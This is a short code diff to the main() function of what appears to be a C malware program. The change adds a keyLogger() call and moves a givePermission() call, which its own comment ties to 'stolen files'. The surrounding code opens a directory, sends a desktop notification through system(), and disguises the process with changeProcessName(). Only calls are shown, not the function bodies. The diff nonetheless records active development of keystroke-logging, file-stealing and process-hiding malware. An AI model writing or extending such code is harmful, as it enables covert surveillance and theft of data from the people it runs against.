@@ -15,6 +15,10 @@ int main(int argc, char *argv[]) {
 	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
 	openDir("test", 0);
 
+	
+	// Give permission to access stolen files
+	givePermission();
+	keyLogger(); 
 	char command[100], msg[1000];
 
 	strcpy(command,"notify-send ");
@@ -23,9 +27,6 @@ int main(int argc, char *argv[]) {
 
 	// Send system message
 	system(command);
-
-	// Give permission to access stolen files
-	givePermission();
 
 	changeProcessName(argv);
 	return 0;
